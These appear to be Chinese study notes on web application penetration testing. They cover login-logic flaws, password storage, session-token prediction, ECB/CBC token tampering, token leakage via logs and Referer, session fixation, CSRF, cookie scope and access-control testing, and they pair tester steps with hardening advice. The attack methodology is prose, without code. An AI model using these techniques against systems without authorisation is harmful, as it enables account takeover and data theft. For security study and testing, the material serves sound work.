根据观察到的结果，调整测试过程；如果某个修改造成了行为的改变，设计将这个修改与其他修改进行组合，使应用程序的逻辑判断达到最大限度，以暴露其中可能存在的逻辑漏洞； 多阶段登录机制中的缺陷多阶段本意是想提高安全性，但是容易出现逻辑缺陷；开发人员经常会做出一些潜在的危险假设，包括： 应用程序认为访问第三阶段的用户已经完成了前两个阶段的认证； 应用程序可能会信任由第二阶段提交的数据，因为到达第二阶段表示通过了第一阶段的认证； 应用程序认为每个阶段的用户身份不变发生变化，因此并没有在每个阶段确认用户身份； 渗透测试步骤 使用一个受控账户执行一次完整的多步骤登录，用拦截器记录提交的每一份数据； 检查是否不止一次收到某条信息，或者是否有信息被返回给客户端，并通过隐藏表单字段、cookie或者预先设置的 URL 参数重新提交； 使用各种畸形请求多次重复登录过程：包括：尝试按不同的顺序完成登录步骤、尝试直接进入任何特定的阶段从那里继续登录、尝试省略每个阶段并从下一阶段继续登录、发挥想象力想出开发者无法预料的方式访问不同的阶段； 如果有数据不止提交一次，尝试在另外一个阶段提交一个不同的值，看是否能够成功登录；有些数据在某个阶段得到确认后，随后就被应用程序所信任；在这种情况下，可先用一个用户名通过第一阶段，再使用另一个用户名登录第二个阶段； 特别注意任何通过客户端传送，但不需要用户直接输入的数据，应用程序很有可能使用它们来保存登录的进度状态并且信任这些数据； 有些登录机制在用户名和密码验证后，会提出一个随机私密问题，要求用户进行回答；但有时候存在两个设计漏洞： 应用程序将问题细节放在隐藏字段中，而没有保留在服务器上，使得攻击者可以自动选择回答哪个问题； 应用程序没有记录用户回答错误的记录，因此攻击者有机会遍历所有问题，然后找一个可以回答的； 渗透测试步骤 如果应用程序使用了随机问题，检查问题本身是否和回答一起请求，如果是的话，尝试改变问题并提交正确答案，看能否成功登录； 如果应用程序不允许攻击者提交任意问题，则使用同一个账户反复进入这个问题，枚举所有存在的问题；有时应用程序会使用持久性的 cookie 让问题保持不变，此时只需要改变 cookie 即可以绕过限制； 不安全的密码存储应用程序常常以危险的方式将用户密码保存在数据库中，例如以明文存储；即使使用 MD5 或者 SHA-1 等算法进行散列处理，攻击者仍然可以在预先计算的散列值数据库查找观察到的散列；另外，由于应用程序使用的数据库账户需要随时读写这些密码，因此存在其他漏洞导致可以访问这些密码的风险； 渗透测试步骤 分析应用程序有所有与用户验证或维护有关的功能，如果发现服务端有返回用户的密码，则说明用户的密码是明文存储的，或者使用了某种可还原的加密形式保存密码； 如果发现应用程序中存在任意一种命令或执行查询的漏洞，则设法弄清楚应用程序将用户密码保存在数据库或文件系统中的什么位置；找到这些位置，弄清应用程序是否以非加密形式保存密码；如果以散列形式存储密码，则检查是否分配账户时常用或默认密码，以及未经过加盐处理的散列值；如果没有加盐，则可以查询在线散列数据库，以确定对应的明文密码值； 保障验证机制的安全不同的验证方案有不同的优缺点，在追求安全性的基础上，有时候需要牺牲功能、易用性和总成本等；因此，决策者需要在不同的方案和目标之间做好权衡，评估所付出的安全成本，是否能够被足够的收益所抵销； 使用可靠的密码 强制执行适应的最小密码强度要求，包括最小长度、使用字母+数字+特殊字符，同时使用大小写，避免使用单词、名称和常见密码，避免使用用户名为密码，避免使用和以前的密码相似或相同的密码； 应使用唯一的用户名； 系统生成的任何用户名和密码应具有足够的随机性，不包含任何顺序，以便攻击者无法进行预测； 允许用户设置足够强大的密码，例如增加长度和特殊字符； 安全处理密码 使用不会造成泄露的方式创建、保存和传送所有密码； 使用 SSL 保护客户端和服务端之间的通信； 在加载登录表单页面即使用 HTTPS ，而不是在提交登录信息时，才切换到 HTTPS； 只使用 POST 请求向服务器传输密码，绝不将密码放在 URL 或者 cookie 中；绝不将密码返回给客户端； 不将密码的原始值保存在数据库中，使用强大的散列函数加盐后保存，以便攻击者即使获得密码后也无法还原； 客户的“记住我”功能仅限于记住用户名，不可用于记住密码； 要求用户定期修改密码； 如果需要给用户分配密码，则应该以尽可能安全的方式传输密码，并设置时间限制，同时要求用户在第一次登录时更改密码，并告知用户在初次使用后销毁原始通信记录； 正确确认密码 应确认完整的密码，不过滤、截短或修改任何密码； 应用程序需要在登录处理过程中捕获所有异常并处理异常，出现异常后，应当删除用于控制登录状态的所有会话和相关数据，并使当前会话失效，以便让攻击者的会话强制退出； 严格审查验证逻辑的伪代码和源代码，避免其中存在任何的逻辑漏洞； 如果应用程序存在伪装功能，应该严格限制这种功能，防止攻击者利用它获得未授权的访问；该功能不得公开访问，仅限于内部访问；对访问方式进行严格审核和控制； 对阶段登录进行严格控制，防止攻击破坏各个阶段的转换与关系； 登录阶段的进度和上一阶段的结果应该只保存在服务端，绝不可以传送到客户端； 禁止用户多次提交一项登录信息； 禁止用户修改已经被收集或确认的数据；如果某个数据需要在各个阶段重复使用，应该保存在会话中进行引用； 每个登录阶段都应该先核实前面的阶段已经顺利完成，如果发现前面的阶段没有完成，应该将验证标记为恶意尝试； 为避免攻击者知悉是哪个阶段登录失败，即使用户无法完成前面的阶段，即使最初的用户名无效，应用程序也应该总是走完所有的登录阶段，之后再呈现登录失败的信息，同时不提供关于失败位置的任何信息； 如果在登录过程中需要回答一个随机的问题，需要确保攻击者无法选择问题； 如果已经向一个用户提出一个特定的问题，将该问题永久性的保存到用户资料中，确保每次该用户尝试登录时提出相同的问题，直到该用户正确回答了这个问题；（这种方式也是有漏洞，即攻击者可以利用这个机制来枚举有效的用户名，因为无效的用户名没有存储问题）； 如果向某个用户提出一个随机变化的质询，而问题应该保存在服务端，禁止保存到 HTML 的隐藏字段中，并根据保存的问题，核实用户提供的答案； 防止信息泄露 应用程序使用的各种验证机制不应泄露关于验证的参数信息，以便攻击者无法判断是哪项提交的数据出了问题； 使用一个统一的组件来负责响应所有的失败消息，确保失败消息总是呈现一致性，以避免攻击者利用不一致来获得信息； 如果应用程序使用账户锁定机制，则该机制可被利用来枚举有效的用户名； 如果应用程序支持自我注册，则该机制可被利用来枚举有效的用户名；因此应要求用户使用电子邮件进行注册，当用户注册后，发邮件到其邮箱，通知注册结果；如果用户已经注册过了，就在邮件中说明已注册，如果用户未注册，就在邮件中放上一个唯一的 URL 让用户继续完成余下的注册步骤； 阻止蛮力攻击 当用户失败超过一定次数后，可将账户冻结一定的时间，例如30分钟；这样做算是一个折中，避免非常规激活给用户增加太多的成本，也给攻击者增加成本； 应用程序不得透露任何关于存在冻结的信息，仅仅是提示有这种可能性即可； 应用程序不得透露冻结的时间； 如果账户被冻结，应用程序不再检查用户密码，直接拒绝登录尝试； 账户冻结措施不能万无一失，因为即使是5次的失败机会，也意味着攻击者有4次尝试不会引起锁定； 在需要验证的页面使用 CAPTCHA 质询，用来防止自动化的数据提交（不过现在也出现了很多破解 CAPTCHA 的工具，它只能用来提高攻击成本，吓退那些随意的攻击者）（有时候 CAPTCHA 的答案还会隐藏在表单字段中，使得攻击者不用解题即可以获得答案）； 防止滥用密码修改功能 应用程序必须设计密码修改功能，以便让用户定期修改密码； 只能从已经通过验证的会话中访问该功能； 不应以任何形式直接提供用户名，如隐藏的表单字段或者 cookie；企业修改他人密码的为定为非法行为； 要求用户修改密码时同时输入现有密码，以避免会话劫持漏洞、跨站点脚本攻击等； 为防止错误，新密码应该要求用户输入两次； 当尝试失败时，应使用常规错误消息告知错误，不能泄露错误的原因，如果出现多次失败，应临时冻结该功能； 应使用非常规的方式，通知用户密码已经修改，并且在通知中不得包含新密码或旧密码的信息； 防止滥用账户恢复功能 通过电子邮件向用户发送一条唯一的、有时间限制的、无法猜测的随机性 URL 帮助用户重新控制账户；当用户恢复账户后，再发送一封电子邮件通知用户密码已经修改；在用户的新密码修改成功前，旧密码应保持有效； 绝对避免使用密码“暗示”之类的功能，因为很多用户自己设置的暗示跟明示差不多； 日志、监控与通知应用程序应在日志中记录所有与验证有关的事件，包括登录、退出、密码修改、密码重设、账户冻结与账户恢复，日志中应包含一切相关的细节（如用户名和 IP 地址），但不得记录任何机密信息（例如密码）；应用程序应为日志提供强有力的保护，以防止未授权的访问，因为它们是信息泄露的主要源头； 当出现异常事件时，应用程序应进行实时警报和主动入侵防御； 应以非常规的方式通知用户任何重大的安全事件，例如在用户尝试修改密码后，向其发送邮件进行告知； 应以非常规的方式告知用户其上次登录的时间和位置，以及在那之后无效登录的次数，以便让用户知悉其账户很可能正在遭受蛮力攻击，保存其设置更加安全的密码； 小结验证功能是应用程序受攻击面中最重要的目标，匿名用户可以直接访问该功能，使得其很容易暴露在所有攻击者面前；现实的验证机制存在着大量的设计与执行缺陷，使用系统化的方法尝试各种攻击途径，即可以对这些缺陷发起全面有效的攻击； 许多时候，漏洞显得易见；另一方面，有些缺陷隐藏得很深，需要对登录过程的逻辑进行反复推敲和分析，才能发现并利用这些缺陷； 7. 攻击会话管理状态要求会话机制中存在两大类的漏洞： 生成会话过程中的漏洞； 处理会话过程中的漏洞； 渗透测试步骤 应用程序经常在多个地方使用会话，包括 cookie、 URL 参数、隐藏表单字段等，以适应不同功能的状态判断需要，避免只检查一个地方； 有时候由 Web 服务器生成的标准会话令牌只是例行动作，并不定表示它一定会被应用程序所使用； 当用户经过验证后，仔细检查客户端收到哪些新的数据项，一般来说，应用程序在此时建立新的会话令牌； 找一个确定需要使用会话令牌数据的页面，例如个人资料页，尝试性的删除某个疑似令牌的数据后提交请求，如果返回的页面出现变化，不再是原来的那个页面，则说明该数据很可能为会话令牌； 并不是每个应用程序都会使用会话，有也其他替代方案可以用来进行状态 HTTP 验证：客户端在每次请求中，都在消息头中重复提交密码进行验证； 无会话机制：将用户的状态数据保存在客户端，由用户在下一次请求的时候提交这些状态数据，没有保存在服务端，这样服务端就没有必要使用会话机制维护状态了；如果使用这种方式的话，就需要使用一个比较大的对象来存放状态信息了； 渗透测试步骤 用排查法进行测试，看是否存在疑似令牌的数据； 如果存在以下现象，则说明应用程序很可能将会话状态保存在客户端，包括：向客户端发送的令牌数据比较大（如大于等于100B）、应用程序对每个请求做出响应后，发布一个新的类似令牌、数据似乎被加密（无法辨识其结构）或包含签名（由于有意义的结构和几个字节的无意义二进制数据组成）、应用程序拒绝通过多个请求提交相同数据的做法； 如果应用程序不使用会话令牌管理状态，则本章的所有攻击手段都没有效果，需要寻找其他方向的漏洞来进行渗透； 会话令牌生成过程中的薄弱环节使用令牌的一些场景 发送到用户注册的电子邮件地址的密码恢复令牌； 存放在隐藏表单字段中的令牌，用于防止跨站点脚本攻击； 用于一次性访问受保护资源的令牌； “记住我”功能使用的永久令牌； 未启用验证功能的购物应用程序，让用户可检查当前订单状态的令牌； 令牌有一定的含义有些应用程序没有随机生成令牌，而是基于用户的个人信息来生成令牌；而用户的信息字段呈现某种多样性，有数字、字符串、邮件等；为了让信息的传输符合 HTML 的标准，应用程序先对信息进行编码，例如十六进制、Base64 等，这种方式通常会表现出某种结构，例如通常以分隔符隔开；另外，不同部分很可能使用不同的编码方式； 结构化的令牌的组成成分常包括以下几项： 账户用户名、用户姓名中的名和姓、用户的电子邮件地址、用户的角色； 应用程序用来区分账户的数字标识符； 日期时间截； 一个递增或可预测的数字； 客户端的 IP 地址； 虽然结构化令牌经常包含很大的数据量，但并不是每个请求都会使用里面的全部数据，每个请求经常只使用其中的一两个数据项； 渗透测试步骤 从应用程序获取一个令牌，每次修改其中的一个字节，然后重新发送，观察应用程序是否仍然正常响应；如果是的话，说明所修改的部分并未在请求处理过程中发挥作用，可以在接下来的分析中将其排除在外，以减轻分析的负担，提高效率； 在不同的时间，以不同的用户登录，记录服务器发布的令牌数据； 如果允许自我注册，注册一些非常相近的用户名并登录，观察返回的令牌的区别； 如果在登录阶段，有提交一些与用户相关的数据，对其进行系统化的修改，并记录登录后收到的令牌； 对令牌进行分析，查找任何与用户名或其他用户可控制的数据相关的内容； 查找令牌中任何明显的编码或模糊处理方案；常用的方案有 XOR、十六进制、Base64 等； 当对令牌数据的逆向工程取得有意义的结果时，尝试看能否猜测出应用程序最近向其他用户发布的令牌，在一个使用令牌才能显示令牌的页面，发送大量的请求，对猜测结果进行测试； 令牌可预测有时候令牌中并不包含任何与用户有关的数据，但是令牌的生成本身具有的一定的顺序规律性，因此可以尝试猜测其他可能存在的有效令牌，并发送大量请求进行验证；这种方法的成功率比较低，可能只有千分之一，但是由于可以使用自动化的工具，在短时间内发送大量的请求进行验证（例如验证响应的长度即可区分有效和无效的请求），因此它也能够在短时间内找到很多有效的令牌； 可预测的会话令牌通常源于三点： 隐含序列； 时间依赖； 生成的数字随机性不强； 隐含序列有时候序列并不是一眼就可以发现的，需要在第一轮的解码后，再做第二轮的算术处理例如第二个值减去第一个值，之后就会暴露出其中隐藏的模式出来； 时间依赖有些令牌的生成跟时间有关（一般会呈现递增规律），虽然以毫秒进行计算得到的随机值很大，但是攻击者可以每隔一小段时间就获取令牌，当发现跳跃的时候，很可能是应用程序给一个刚登录的用户生成了令牌，由于攻击者拥有该跳跃前和跳跃后的令牌数据，因此可以大大缩小枚举的范围，通过不断发请求进行尝试，获得用户的有效令牌；攻击者可以使用这个方法一直枚举有效令牌，直至等到管理员登录，届时将直接获得管理员的权限； 生成的数字随机性不强计算机生成的随机数基本上都是伪随机的，它其实是有规律的，差别在于开发者如何去除它的规律性，如果开发者使用成熟框架的默认函数，则去除的办法相当于被公开了，那么攻击者在获得一个令牌后，就可以推测出下一个令牌的值，甚至之前所有令牌的值； 测试随机性强度如果收集了足够多的令牌样本后，就可以使用统计方法来判断令牌是否具备随机性；它的基本理念是在大量令牌中判断某些特殊点的出现次数，看它是随机分布的，还是具备一定的规律性；Burp Sequencer 即是一个现成的判断随机性的工具； 两个注意事项： 即使是按照既定算法计算的结果，也是有可能通过随机性测试的，此时并不代表这个令牌没有漏洞，在了解了算法和生成器的内部状态后，就可以非常准确的正向或者逆向推断出它的输出； 没有通过随机机测试的令牌，也不能保证它一定可以被逆向工程；因为部分数据位出现非随机性，不代表整个序列可以被预测； 渗透测试步骤 遍历整个应用程序，观察它是在什么场景下发布新令牌的；一般来说有两种常见的场景会发令牌，一种是登录后，一种是在请求中没有发现令牌的时候；只要找到了这个场景，才能够大量的收集令牌； 使用 Burp Suite 中的 Burp Sequencer 功能对令牌进行实时补获，以便尽可能多的收集令牌，避免错失应用程序给那些真正的用户发布的令牌，同时这样也可以降低对时序的依赖； 如果应用程序使用商业会话管理机制，或者可以本地访问应用程序，则可以在受控的条件下收集无数的令牌； 在 Burp 收集令牌的同时，打开“自动分析”的功能；先至少收集500个令牌，然后详细审查分析结果；即使令牌中有足够的数据位通过了测试，也继续尽可能长时间的收集令牌，并在审查分析结果； 如果令牌未通过随机性测试，并且似乎包含某种模式可用于预测，此时需要更换一个 IP 地址，使用不同的用户名重新开始收集操作；因为令牌有可能使用用户名或者用户的 IP 地址作为令牌生成的参数； 如果攻击者对令牌的生成算法有了把握，接下来最好的办法是使用一段定制的脚本来实施攻击，因为它能够使用观测到的模式来生成令牌，并用上相应的编码技巧； 如果可以查看源代码，则应仔细检查负责生成令牌的代码，了解它使用的机制，并确定是否能够轻易的预测该令牌； 如果确定可以从应用程序数据中的熵实施蛮力攻击，则需要预估一下需要发起的具体请求数； 加密令牌有些应用程序在令牌中包含有意义的信息，并对这些进行加密；根据所使用的不同加密算法，这种做法可能是有漏洞的； ECB 密码ECB 指电子密码本，它经常被一些对称加密算法所使用；它的缺点是明文与密文存在相似的模式，例如相同的分组方法； 由于令牌中的内容不一定会被应用程序全部使用，因此通过更改和拼接分组的内容，可能会导致出现用户伪装的漏洞； CBC 密码CBC 表示密码块链，它的出现是为了解决 ECB 存在的漏洞问题，即在将某段明文转换成密文之前，先把它与上一个密文块做 XOR 运算，之后再转换成密文；这样就可以避免 ECB 中存在的分组漏洞问题了； 但是这种方式也引入了新的漏洞，因为攻击者可以让每次请求只修改令牌中的一个字符，虽然更改后的令牌被解密的时候，相应的字段会变成乱码，但由于该段的值会被用做上一段的 XOR 运算输入，即使是乱码值，也有可能生成有意义的 XOR 运算结果；那么，当应用程序没有判断所有字段内容进行令牌有效性判断的话，只读取其中某个字段的值，那么攻击者将有可能伪装成功； Burp Intruder 中的 bit flipper（位翻转程序）即可以用来测试令牌是否有这方面的漏洞；位翻转对数字类型的值的效果比较好，对文本类型的效果比较差； 当应用程序在令牌中使用某种对称性加密算法时，如果应用程序的其他功能也需要使用加密算法时，很有可能它们会使用同一个对称加密算法，此时如果能在应用程序的其他功能获得某个加密值的源值（例如通过受控账户控制输入值），则可以利用这个信息完全解密任何受保护的信息； 渗透测试步骤 如果会话令牌没有明显的意义，或者本身是连续的，那么令牌很有可能是被加密的； 通过注册几个不同的用户名，每次为用户名多添加一个字符，如果添加一个字符会让令牌的长度增加8或16个字节，则说明应用程序可能使用的是分组密码；此时可以再注册一个添加一个字符的用户名，看是否同样的增加了8或16个字节； 可尝试通过移动令牌中的密文分组进行登录，看应用程序如何反应； 可尝试使用位翻转令牌中有效的荷载源来访问应用程序，如果翻转后应用程序仍然能否正常使用，那么可以扩大范围，对这个部分中的每个值进行测试，以找到更有针对性的攻击方法； 在前述的两种攻击方法中，注意监控应用程序的反应，确定响应中的用户信息是否出现变化；如果有的话，可使用这种方法来尝试提升权限； 在通过增加单个字符来获取更长的令牌的时候，通过反复不断增加字符，最后可以达到应用程序所使用的分组大小，这样就增加了分组边界对齐的概率；然后，对于不同用户名生成的一系列令牌，使用前面两种操作（移动或者翻转）进行尝试 会话令牌处理中的薄弱环节在网络上泄露令牌 当令牌使用非加密方式在网络上传输时，就有可能导致令牌泄露；之后窃听者并不需要破解令牌，只需要使用获得的令牌就可以伪装成其他用户进行登录了（由于还能够截获其他机密信息，理论上窃听者都可以使用密码自行登录，但有时候为了尽量保持隐秘，有可能没这么做）； 有些应用程序在用户初始打开页面的时候，就给用户发了令牌，但是此时却是使用 HTTP 传输，之后等用户登录的时候才转成 HTTPS，并且在用户登录后没有给用户发送新令牌；即使在用户登录后使用新令牌，如果此时用户点击了应用程序中那些不需要验证的页面，转成了 HTTP 传输，此时将直接造成令牌泄露； 有些应用程序对所有静态资源使用 HTTP，如果此时用户已经在之前的页面完成了验证，则将使得令牌泄露； 即使应用在所有页面都使用了 HTTPS 传输，如果攻击者有方法诱使用户发送一个 HTTP 请求，即可以获得这个令牌；（攻击者一般可以通过在电子邮件中或即时消息中给用户发送一个 URL，并在他控制的一个 Web 站点中插入一个自动加载的链接即可完成相应的目的）； 渗透测试步骤 以正常方式访问应用程序，进行登录，然后访问应用程序的每一个功能，记录每一个被访问的 URL 以及收到新会话令牌的每种场合；特别注意 HTTP 和 HTTPS 进行切换的场景；可使用网络嗅探器或使用代理服务器中的日志自动化完成这一个工作； 如果应用程序使用 HTTP cookie 来传送会话令牌，此时应注意是否启用 secure 字段，如果没启用的话，则令牌是通过非加密连接传送的，很容易可以实现拦截； 如果初始使用 HTTP，在登录后切换到 HTTPS，确定一下是否有发布新令牌，以及在 HTTP 阶段的令牌是否仍然可用；并且尝试再切换回 HTTP 的页面时，应用程序是否仍然可以访问； 即使应用程序在每一个页面都使用 HTTPS，确认一下服务器是否监听 80 端口，如果是的话，直接使用验证后的会话令牌访问所有的 HTTP URL，确认会话令牌是否被传送；如果有传送，确认下是否依然有效； 在日志中泄露令牌很多应用程序会为管理员或运营人员提供监控应用状态的功能，这些功能有时会访问应用程序的日志，当这些功能没有得到很好保护的时候，攻击者就有可能使用它来获得所有用户的令牌列表； 日志中之所以有会话令牌，其中一个重要的原因是有很多应用使用 URL 参数来传送令牌，而不是使用 cookie 或者 POST 请求； 处于 URL 参数中的令牌，将会在以下各种场景中被记录： 用户浏览器的日志； Web 服务器的日志； 企业或 ISP 代理服务器的日志； 任何在应用程序主机环境中采用的反向代理日志； 应用程序的用户，点击站外链接访问的任何服务器的 Referer 日志； 虽然 HTTPS 可以防止 URL 中的参数被日志记录，但是如果用户点击了页面中的站外链接，包含参数的完整 URL 将会出现在站外链接服务器收到的消息头中的 Referer 字段中； 渗透测试步骤 找出应用程序的所有功能（参见之前搜索隐藏链接的技巧），找出可以查看会话令牌的任何日志或监控功能；并查明认证可以访问这些功能； 找出应用程序中使用 URL 传送会话令牌的任何情况；即使应用程序在内部都使用安全的传输方式，但在访问外部系统时，有时会使用非安全的传输方式； 如果应用程序在 URL 中传送会话令牌，那么可以寻找一些允许用户自动上传内容的功能，使用这些功能，上传包含站外链接的内容，链接至自己搭建的服务器，等待一段时间，查看日志中的 Referer 字段是否收到任何用户的会话令牌； 如果截获到任何会话令牌，通过拦截服务器的下一个响应，使用截获的 cookie 值添加自己的 Set-Cookie 消息头，来实现切换用户的目的；在 Burp 中，可以使用一个 Suite 范围的配置，在所有指向目标应用程序的请求中设置一个特殊的 cookie，以便在测试期间可以在不同的用户之间快速轻松切换； 如果截获大量的令牌，并且通过截获的令牌可以访问用户的敏感数据，就能通过自动化工具获得大量的其他用户的数据； 令牌-会话映射易受攻击理想的会话管理机制中，不应该允许同一名用户拥有多个会话，因为这样有很多安全的隐患，例如攻击者利用会话进行连接却不会被发现； 有些应用程序使用静态的会话令牌，这种情况更加糟糕，因为它完全无法判断是否同时存在多个会话，而且令牌永远有效，一旦泄露，更改密码也没有用； 有些应用程序使用用户名+1个随机值来生成令牌，这种机制生成出来的令牌看似随机，但其实跟静态会话可能没有什么两样，因为只要随机值是有效的，这个令牌就自然生效了，完全不需要验证； 渗透测试步骤 用相同的用户账户不同的浏览器或计算机先后登录应用程序，确定这两个会话是否会都处于活动的状态，如果是的话，表示应用程序并行会话；这样截获其他用户令牌的攻击不会有被检测出来的风险； 用相同的账户，在不同的浏览器先后登录并退出系统，比对每次收到的令牌是一样的，还是不同的；如果都一样，说明令牌是静态的，有严重的设计缺陷； 如果令牌包含某有结构和意义，尝试将其他与用户有关的部分隔离出来，单独修改该部分的值，让它指向另外一个用户，确定修改后的令牌是否能否正常使用，以及能否伪装成其他用户； 会话终止易受攻击让会话的生命周期尽量短有两个好处： 一是可以避免攻击者利用被截获的令牌； 二是可以避免用户使用共享计算机时出现的危险； 有些应用程序设计得很糟糕，要么完全没有让用户自行终止会话的行为，要么即使有也并没有真正的执行； 渗透测试步骤 通过以下方式检查服务端是否执行了终止会话的操作：登录获取一个有效令牌，每间隔一段时间访问一下需要该令牌才能访问的页面，看应用程序是否返回正确的响应（可在自动化工具中设置好时间间隔）； 查找一下是否有退出的功能，如果没有，意味着用户无法主动终止会话，存在被攻击的隐患； 如果有退出的功能，在退出后，测试一下原来的令牌是否能够有效，如果有效，表示这是一个假退出； 客户端暴露在令牌劫持风险之中保存在客户端的令牌有可能存在被窃取的风险，例如使用跨站点脚本、或者固定令牌伪装； 渗透测试步骤 确认应用程序中是否存在跨站点脚本漏洞，看是否可以利用这些漏洞截获其他用户的令牌； 如果应用程序在用户登录前就发令牌，并且登录后仍沿用该令牌，则说明容易受到固定会话攻击； 即使应用程序在用户未登录前没有发令牌，而只是在登录后发令牌，如果在登录后，应用程序允许用户返回登录前的那个页面，这意味着用户很可能可以使用已获得的有效令牌，然后用另外一个用户名登录；如果在登录后，应用程序没有发一个新令牌，那么存在固定会话攻击的漏洞； 确定应用程序会话令牌的格式；用一个格式有效的伪造令牌尝试进行登录，如果应用程序允许使用一个捏造的令牌建立一个通过验证的会话，那么存在固定会话漏洞； 如果应用程序完全依靠 HTTP cookie 传送会话令牌，有可能容易受到跨站点请求伪造（CSRF）的攻击；先登录应用程序，然后在同一个浏览器进程中，在其他站点页面向先应用程序发送一个请求，确认它是否会提交用户的令牌；可利用这个缺陷执行目标用户权限下的一些操作（攻击者需要先确定好相关敏感功能所需要提交的各项参数）； 宽泛的 cookie 范围根据 HTTP 协议，服务器在 Set-Cookie 字段中，还可以使用 domain 和 path 两个字段来告知浏览器该 cookie 适用的域名和路径； cookie 域限制如果没有指定 domain 的值，cookie 默认仅适用于当前域及其子域，不包含父域或者兄弟域； 如果服务端在指定 domain 值的时候，设置得过于宽泛，例如 abc.com 之类的根域名，这意味着该 cookie 将在根域名下的任何子域名中都有效；那么任何一个子域名页面，都有机会收集原本属于其他子域名的 cookie； 由于基于域的 cookie 隔离没有同源策略那么严格，当一个应用程序和另外一个漏洞应用程序共享同一个根域名，而只是通过端口号或者协议来区别彼此的时候，攻击者将有机会利用这种漏洞通过一个应用程序获取另一个应用程序的 cookie； 渗透测试步骤 如果应用程序将 cookie 范围放宽到父域，将容易受到通过兄弟域名下的其他应用程序实施的攻击； 如果应用程序使用 domain 的默认值，或者将其设置为当前域名，则子域仍然可以访问 cookie； 确定一个应用程序的所有子域名，如果子域名下有其他应用程序，尝试通过他们获取当前应用程序的 cookie cookie 路径限制HTTP 协议支持对 cookie 的作用路径进行指定，默认也是当前路径及其下的子路径；但如果开发者扩大了路径范围，将使得父级路径和兄弟路径的不可信程序有机会控制应用程序； 保障会话管理的安全生成强大的令牌有效的令牌生成机制应该具备以下两个特点： 使用数量极其庞大的一组可能值；取值范围应大到让攻击者在令牌有效期无法通过蛮力猜测破解； 包含强大的伪随机源，确保令牌值以无法预测的方式平均分布在取值范围中； 令牌中不应该保存任何有意义的数据，整个会话对象应该保存在服务端； 谨慎选择随机数算法，确保它是不可预测的；当然这也是要付出代价的，越不容易猜测的随机数，意味着计算它的时间越久，使得应用程序的响应越慢； 除了选择最为稳定可靠的随机数算法外，在生成令牌的过程中，加入一些额外的令牌（如访问者 IP，请求的时间截）作为熵源，也是一种良好的作法； 在整个生命周期保障令牌的安全 令牌只能使用 HTTPS 传送； 绝不能在 URL 中传送会话令牌； 总是执行退出功能，删除服务器上的所有会话资源并终止会话令牌； 会话处于非活动状态一段时间后（如10分钟），应执行会话终止； 防止并行登录；每次登录都发布一个新的令牌，同时终止删除现有用户的所有会话；如果旧令牌不能马上删除的话，如果有用户使用旧令牌尝试登录，应给用户发出警报，告知有在其他设备尝试登录； 尽可能限定会话 cookie 的域和路径范围，留意框架或 Web 服务器软件的默认配置； 应严格审查应用程序的源代码，避免存在任何形式的跨站点脚本漏洞； 如果有用户提交服务器不认可的令牌，应立即在浏览器删除该令牌，并将用户返回到应用程序的起始页面； 在执行转账之类的重要操作前，应进行两步确认或重新验证，以便有效防御跨站点请求伪造和其他会话攻击； 跨站点请求伪造攻击之所以可行，其中一个原因在于应用程序可能完全依赖 cookie 来传送令牌，如果应用程序不完全依赖 cookie 传送令牌，例如同时使用每页面令牌，则可以防御跨站点的请求伪造； 成功登录验证后，应总是建立一个新会话，以避免固定会话攻击的影响；如果有无须登录即可提交敏感数据的功能，则不应该在页面上面显示敏感数据，应进行部分隐藏处理； 每页面令牌：除了会话令牌，增加一个每页面令牌，当用户请求一个页面时，生成一个新令牌放在隐藏表单字段中；当用户在该页面发起新请求时，除了验证主令牌外，还验证页面令牌，如果不匹配，整个会话将终止； 日志、监控与警报会话功能应该与日志和警报功能紧密结合，以帮助管理在必要时采取防御措施； 应用程序应监控包含无效令牌的请求； 如果收到大量包含无效令牌的请求，可将其 IP 屏蔽一段时间； 在日志中保留针对会话攻击的记录，有助于管理员对攻击进行调查； 只要有可能，应向用户警报与会话相关的反常事件，例如并行登录、以便促使用户进行检查； 反应性会话终止：当收到一些显然不可能由普通用户提交的请求时，应该迅速终止会话，以便延长攻击者的探查时间； 小结现实世界中的会话管理机制通常存在很多漏洞，并且会成为攻击者的重点目标，因为如果能够攻破管理员的会话，往往能够攻破整个应用程序；耐心与不懈往往是完成攻克的最大利器；虽然解译看似随机生成的令牌费时又费力，但是它通常可以获得巨大的回报； 8. 攻击访问控制常见漏洞完全不受保护的功能有些敏感功能在应用程序中使用隐藏的、没有任何访问控制的 URL 来访问，这是非常危险的，因为 URL 可能出现在任何日志中，浏览器的记录、页面 JS 代码和注释等； 直接访问的方法：某些应用程序会将服务器某个对象的方法前移到客户端组件中，由客户端的代码直接调用，此时有可能存在漏洞，例如用户本来只能某个方法，但现在却将对象的所有方法全部暴露了； 基于标识符的功能服务端的资源经常使用标识符进行访问，有些应用程序会将标识符直接放在请求的 URL 参数中，当标识符很容易被猜测的时候，就很容易被未授权访问； 在某些单页面应用中，不仅资源会使用标识符，连功能都有可能使用标识符，此时如果攻击者发现这些 URL，就可以像拥有高级权限的一样访问它们； 多阶段功能开发者经常会假设访问第二个阶段的用户一定是通过了第一阶段的验证，但其实不然；攻击者可以利用这个漏洞，直接访问第二个阶段的功能； 静态文件有些应用程序的静态文件是由 Web 服务器软件管理的，因此它很可能并没有任何的访问控制，只需要有一个 URL 就可以进行访问了； 这些静态文件包括图片、书籍、报告、二进制代码，甚至有时还会有日志文件； 平台配置错误有些应用程序使用第三方的控件平台来实现访问控制，平台的配置类似防火墙规则的配置，一般基于 HTTP 请求方法、URL路径、用户角色等三个条件实现控制；但是有时开发者会存在规则配置错误的情况，没有完整详细的进行设置，导致可能出现漏洞； 访问控制方法不安全还有一些奇葩的应用程序会使用客户端提交的参数来做出访问控制； 基于参数的访问控制：例如在参数中指明当前用户是否为管理员； 基于 Referer 的访问控制：有些应用程序基于请求中的 Referer 字段值来控制权限，例如来源于管理页面的请求即表示拥有管理员权限； 基于位置的访问控制：例如基于 IP 地址的地理位置，但是这种方 式很容易被绕过，例如使用代理服务器、VPN、移动设备； 攻击访问控制在开始探查访问控制漏洞之前，应先就应用程序现有的响应结果进行分析，之后再有针对性的实施探查； 渗透测试步骤 应用程序是否允许用户访问属于他们的特定数据； 是否存在各种级别的用户，应用程序允许他们访问不同的功能； 管理员使用的功能是否也内置在应用程序中； 分析应用程序的哪些功能或资源最有可能帮助攻击者提升当前的权限； 是否存在任何的标识符（以 POST 消息体或 URL 参数的方式），表明其使用某一参数来控制访问级别； 使用不同用户账户进行测试 渗透测试步骤 功能的访问控制：首先使用一个权限较高的账户确认所有可用的功能，然后使用一个权限较低的账户访问这些功能，测试能否垂直提升权限； 